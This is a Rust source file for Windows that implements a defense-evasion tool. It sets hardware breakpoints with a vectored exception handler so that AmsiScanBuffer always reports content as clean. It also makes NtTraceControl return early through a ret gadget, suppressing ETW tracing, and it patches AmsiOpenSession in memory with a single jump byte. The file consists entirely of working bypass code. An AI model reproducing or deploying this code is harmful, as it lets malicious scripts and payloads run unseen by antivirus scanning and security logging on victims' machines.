#![allow(non_snake_case,non_camel_case_types)]

use std::ffi::CString;
use std::ptr::null_mut;
use winapi::ctypes::c_void; 
use std::mem::zeroed;

use winapi::shared::{
    minwindef::ULONG,
    ntdef::{NT_SUCCESS, NTSTATUS, OBJECT_ATTRIBUTES},
    ntstatus::STATUS_SUCCESS,

};

use winapi::um::{
    errhandlingapi::AddVectoredExceptionHandler,
    libloaderapi::{GetProcAddress, GetModuleHandleA},
    winnt::{EXCEPTION_POINTERS, CONTEXT, LONG, CONTEXT_ALL, HANDLE, ACCESS_MASK, THREAD_ALL_ACCESS,PVOID},
    minwinbase::EXCEPTION_SINGLE_STEP,
};
use ntapi::{
    ntexapi::{
        SYSTEM_PROCESS_INFORMATION, SYSTEM_THREAD_INFORMATION, SystemProcessInformation,
    },
    ntpsapi::{PROCESS_BASIC_INFORMATION,NtCurrentProcess},
    ntmmapi::{NtProtectVirtualMemory,NtReadVirtualMemory,NtWriteVirtualMemory},
};

use winapi::um::winnt::PAGE_READWRITE;
use winapi::shared::minwindef::BYTE;
use winapi::shared::minwindef::HMODULE;
use winapi::um::libloaderapi::LoadLibraryA;
use winapi::vc::excpt::{EXCEPTION_CONTINUE_EXECUTION,EXCEPTION_CONTINUE_SEARCH};

const AMSI_RESULT_CLEAN: i32 = 0;
const PATCH: [u8; 1] = [0xEB];
const S_OK: i32 = 0;
static mut ONE_MESSAGE: i32 = 1;

static mut AMSI_SCAN_BUFFER_PTR: Option<*mut u8> = None;
static mut NT_TRACE_CONTROL_PTR: Option<*mut u8> = None;


#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: *mut c_void,
    UniqueThread: *mut c_void,
}

extern "stdcall" {
    fn NtGetContextThread(thread_handle: HANDLE, thread_context: *mut CONTEXT) -> ULONG;

    fn NtSetContextThread(thread_handle: HANDLE, thread_context: *mut CONTEXT) -> ULONG;
    fn NtQuerySystemInformation(
        SystemInformationClass: ULONG,
        SystemInformation: *mut c_void,
        SystemInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtQueryInformationProcess(
        ProcessHandle: HANDLE,
        ProcessInformationClass: ULONG,
        ProcessInformation: *mut c_void,
        ProcessInformationLength: ULONG,
        ReturnLength: *mut ULONG,
    ) -> NTSTATUS;
    fn NtOpenThread(
        ThreadHandle: *mut HANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: *const OBJECT_ATTRIBUTES,
        ClientId: *const CLIENT_ID,
    ) -> NTSTATUS;
    fn NtClose(Handle: HANDLE) -> NTSTATUS;
}



// Bit Manipulation Function
fn set_bits(dw: u64, low_bit: usize, bits: usize, new_value: u64) -> u64 {
    let mask = if bits >= 64 {
        u64::MAX
    } else {
        (1u64 << bits) - 1
    };
    (dw & !(mask << low_bit)) | ((new_value & mask) << low_bit)
}

// Clears a hardware breakpoint at the given index
fn clear_breakpoint(ctx: &mut CONTEXT, index: usize) {
    if index >= 4 {
        return; // Maximum of 4 hardware breakpoints (Dr0 to Dr3)
    }
    let dr_ptr = unsafe { &mut *(&mut ctx.Dr0 as *mut u64).add(index) };
    *dr_ptr = 0;
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 0);
    ctx.Dr6 = 0;
    ctx.EFlags = 0;
}

// Enables a hardware breakpoint at the given address and index
fn enable_breakpoint(ctx: &mut CONTEXT, address: *mut u8, index: usize) {
    if index >= 4 {
        return; // Maximum of 4 hardware breakpoints
    }
    let dr_ptr = unsafe { &mut *(&mut ctx.Dr0 as *mut u64).add(index) };
    *dr_ptr = address as u64;
    ctx.Dr7 = set_bits(ctx.Dr7, 16, 16, 0); // Disable all local breakpoints
    ctx.Dr7 = set_bits(ctx.Dr7, index * 2, 1, 1); // Enable the specific breakpoint
    ctx.Dr6 = 0;
}

// Retrieves function arguments from the CPU context based on index
fn get_arg(ctx: &CONTEXT, index: usize) -> usize {
    match index {
        0 => ctx.Rcx as usize,
        1 => ctx.Rdx as usize,
        2 => ctx.R8 as usize,
        3 => ctx.R9 as usize,
        _ => unsafe {
            *((ctx.Rsp as *const u64).add(index + 1) as *const usize)
        },
    }
}

// Obtains the return address from the stack
fn get_return_address(ctx: &CONTEXT) -> usize {
    unsafe { *(ctx.Rsp as *const usize) }
}

// Sets the result in the CPU context (RAX register)
fn set_result(ctx: &mut CONTEXT, result: usize) {
    ctx.Rax = result as u64;
}

// Adjusts the stack pointer (RSP register)
fn adjust_stack_pointer(ctx: &mut CONTEXT, amount: i32) {
    ctx.Rsp = ctx.Rsp.wrapping_add(amount as u64);
}

// Sets the instruction pointer (RIP register)
fn set_ip(ctx: &mut CONTEXT, new_ip: usize) {
    ctx.Rip = new_ip as u64;
}

// Exception Handler Function
unsafe extern "system" fn exception_handler(exceptions: *mut EXCEPTION_POINTERS) -> LONG {
    if exceptions.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let exception_record = (*exceptions).ExceptionRecord;
    let context_record = (*exceptions).ContextRecord;

    if exception_record.is_null() || context_record.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = &mut *context_record;
    let exception_code = (*exception_record).ExceptionCode;
    let exception_address = (*exception_record).ExceptionAddress as usize;

    if exception_code == EXCEPTION_SINGLE_STEP {
        // AMSI Bypass
        if let Some(amsi_address) = AMSI_SCAN_BUFFER_PTR {
            if exception_address == amsi_address as usize {
                println!("[+] AMSI Bypass invoked at address: {:#X}", exception_address);
                let return_address = get_return_address(context);
                let scan_result_ptr = get_arg(context, 5) as *mut i32;
                *scan_result_ptr = AMSI_RESULT_CLEAN;

                set_ip(context, return_address);
                adjust_stack_pointer(context, size_of::<*mut u8>() as i32);
                set_result(context, S_OK as usize);

                clear_breakpoint(context, 0);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }

        // NtTraceControl Bypass
        if let Some(nt_trace_address) = NT_TRACE_CONTROL_PTR {
            if exception_address == nt_trace_address as usize {
                println!(
                    "[+] NtTraceControl Bypass invoked at address: {:#X}",
                    exception_address
                );
                if let Some(new_rip) = find_gadget(exception_address, b"\xc3", 1, 500) {
                    context.Rip = new_rip as u64;
                }

                clear_breakpoint(context, 1);
                return EXCEPTION_CONTINUE_EXECUTION;
            }
        }
    }

    EXCEPTION_CONTINUE_SEARCH
}

// Searches for a specific byte pattern (gadget) within a memory range
fn find_gadget(function: usize, stub: &[u8], size: usize, dist: usize) -> Option<usize> {
    (0..dist).find_map(|i| {
        let ptr = function + i;
        unsafe {
            if std::slice::from_raw_parts(ptr as *const u8, size) == stub {
                Some(ptr)
            } else {
                None
            }
        }
    })
}

// Retrieves the current process ID using NtQueryInformationProcess
fn get_current_process_id() -> u32 {
    let pseudo_handle = -1isize as HANDLE;
    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let status = unsafe {
        NtQueryInformationProcess(
            pseudo_handle,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as PVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            null_mut(),
        )
    };

    if status != STATUS_SUCCESS {
        1
    } else {
        pbi.UniqueProcessId as u32
    }
}

// Sets up the AMSI and NtTraceControl bypass mechanisms
pub fn setup_bypass() -> Result<*mut std::ffi::c_void, String> {
    let mut thread_ctx: CONTEXT = unsafe { zeroed() };
    thread_ctx.ContextFlags = CONTEXT_ALL;

    unsafe {
        // Resolve AMSI_SCAN_BUFFER_PTR
        if AMSI_SCAN_BUFFER_PTR.is_none() {
            let module_name = CString::new("amsi.dll").unwrap();
            let mut module_handle = GetModuleHandleA(module_name.as_ptr());

            if module_handle.is_null() {
                module_handle = LoadLibraryA(module_name.as_ptr());
                if module_handle.is_null() {
                    return Err("Failed to load amsi.dll".to_string());
                }
            }

            let function_name = CString::new("AmsiScanBuffer").unwrap();
            let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());

            if amsi_scan_buffer.is_null() {
                return Err("Failed to get address for AmsiScanBuffer".to_string());
            }

            AMSI_SCAN_BUFFER_PTR = Some(amsi_scan_buffer as *mut u8);
        }

        // Resolve NT_TRACE_CONTROL_PTR
        if NT_TRACE_CONTROL_PTR.is_none() {
            let ntdll_module_name = CString::new("ntdll.dll").unwrap();
            let ntdll_module_handle = GetModuleHandleA(ntdll_module_name.as_ptr());

            let ntdll_function_name = CString::new("NtTraceControl").unwrap();
            let ntdll_function_ptr = GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr());

            if ntdll_function_ptr.is_null() {
                return Err("Failed to get address for NtTraceControl".to_string());
            }

            NT_TRACE_CONTROL_PTR = Some(ntdll_function_ptr as *mut u8);
        }
    }

    // Register the exception handler
    let h_ex_handler = unsafe { AddVectoredExceptionHandler(1, Some(exception_handler)) };

    // Retrieve the current process ID
    let process_id = get_current_process_id();

    // Retrieve handles to all threads of the current process
    let thread_handles = get_remote_thread_handle(process_id)?;

    for thread_handle in &thread_handles {
        // Get the context of the thread
        if unsafe { NtGetContextThread(*thread_handle, &mut thread_ctx) } != 0 {
            return Err("Failed to get thread context".to_string());
        }

        // Enable breakpoints on AMSI and NtTraceControl
        unsafe {
            if let Some(amsi_ptr) = AMSI_SCAN_BUFFER_PTR {
                enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
            }
            if let Some(nt_trace_ptr) = NT_TRACE_CONTROL_PTR {
                enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
            }
        }

        // Set the modified context back to the thread
        if unsafe { NtSetContextThread(*thread_handle, &mut thread_ctx as *mut CONTEXT) } != 0 {
            return Err("Failed to set thread context".to_string());
        }

        // Close the thread handle
        unsafe { NtClose(*thread_handle) };
    }

    Ok(h_ex_handler)
}

// Retrieves handles to all threads of the specified process
fn get_remote_thread_handle(process_id: u32) -> Result<Vec<HANDLE>, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    // Query system information to get process and thread details
    let status = unsafe {
        NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as PVOID,
            buffer.capacity() as ULONG,
            &mut return_length,
        )
    };

    if !NT_SUCCESS(status) {
        return Err("Failed to call NtQuerySystemInformation".to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut offset: usize = 0;
    let mut thread_handles: Vec<HANDLE> = Vec::new();

    while offset < buffer.len() {
        let process_info: &SYSTEM_PROCESS_INFORMATION =
            unsafe { &*(buffer.as_ptr().add(offset) as *const SYSTEM_PROCESS_INFORMATION) };

        if process_info.UniqueProcessId == process_id as PVOID {
            let thread_array_base = (process_info as *const _ as usize)
                + size_of::<SYSTEM_PROCESS_INFORMATION>()
                - size_of::<SYSTEM_THREAD_INFORMATION>();

            for i in 0..process_info.NumberOfThreads as usize {
                let thread_info_ptr = (thread_array_base
                    + i * size_of::<SYSTEM_THREAD_INFORMATION>())
                    as *const SYSTEM_THREAD_INFORMATION;
                let thread_info = unsafe { &*thread_info_ptr };

                let mut thread_handle: HANDLE = null_mut();
                let mut object_attrs: OBJECT_ATTRIBUTES = unsafe { zeroed() };
                let mut client_id: CLIENT_ID = unsafe { zeroed() };
                client_id.UniqueThread = thread_info.ClientId.UniqueThread;

                let status = unsafe {
                    NtOpenThread(
                        &mut thread_handle,
                        THREAD_ALL_ACCESS,
                        &mut object_attrs,
                        &mut client_id,
                    )
                };

                if NT_SUCCESS(status) {
                    thread_handles.push(thread_handle);
                }
            }
        }

        if process_info.NextEntryOffset == 0 {
            break;
        }
        offset += process_info.NextEntryOffset as usize;
    }

    if thread_handles.is_empty() {
        return Err("Failed to find any threads".to_owned());
    }

    Ok(thread_handles)

}

pub fn search_pattern(start_address: &[u8], pattern: &[u8]) -> usize {
    for i in 0..1024 {
        if start_address[i] == pattern[0] {
            let mut j = 1;
            while j < pattern.len() && i + j < start_address.len() && 
                  (pattern[j] == b'?' || start_address[i + j] == pattern[j]) {
                j += 1;
            }
            if j == pattern.len() {
                return i + 3;
            }
        }
    }
    1024

}


pub fn patch_amsi() -> Result<(), String> {
    let pattern: [BYTE; 9] = [0x48, b'?', b'?', 0x74, b'?', 0x48, b'?', b'?', 0x74];
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let hm: HMODULE = unsafe { GetModuleHandleA(amsi_dll.as_ptr()) };
    
    if hm.is_null() {
        return Err("Failed to get handle to amsi.dll".to_string());
    }
    let amsi_open_session = CString::new("AmsiOpenSession").unwrap();
    let amsi_addr = unsafe { GetProcAddress(hm, amsi_open_session.as_ptr()) };
    let mut buff: [BYTE; 1024] = [0; 1024];
    let mut bytes_read: usize = 0;
    let status = unsafe {
        NtReadVirtualMemory(
            NtCurrentProcess,
            amsi_addr as *mut std::ffi::c_void,
            buff.as_mut_ptr() as PVOID,
            buff.len(),
            &mut bytes_read
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to read memory. Status: {}", status));
    }
    
    let match_address = search_pattern(&buff, &pattern);
    if match_address == 1024 {
        return Err("Pattern not found".to_string());
    }
    
    unsafe {
        if ONE_MESSAGE == 1 {
            println!("[+] AmsiOpenSession patched at address {:#X}", amsi_addr as usize);
            ONE_MESSAGE = 0;
        }
    }
    
    let update_amsi_address = (amsi_addr as usize) + match_address;
    
    let mut old_protect: ULONG = 0;
    let mut size = PATCH.len();
    let mut base = update_amsi_address as PVOID;
    let status = unsafe {
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base,
            &mut size,
            PAGE_READWRITE,
            &mut old_protect
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to change memory protection. Status: {}", status));
    }
    
    let mut bytes_written: usize = 0;
    let status = unsafe {
        NtWriteVirtualMemory(
            NtCurrentProcess,
            update_amsi_address as PVOID,
            PATCH.as_ptr() as PVOID,
            PATCH.len(),
            &mut bytes_written
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to write memory. Status: {}", status));
    }
    
    let mut _temp: ULONG = 0;
    let status = unsafe {
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut base,
            &mut size,
            old_protect,
            &mut _temp
        )
    };
    
    if status != 0 {
        return Err(format!("Failed to restore memory protection. Status: {}", status));
    }
    
    Ok(())
}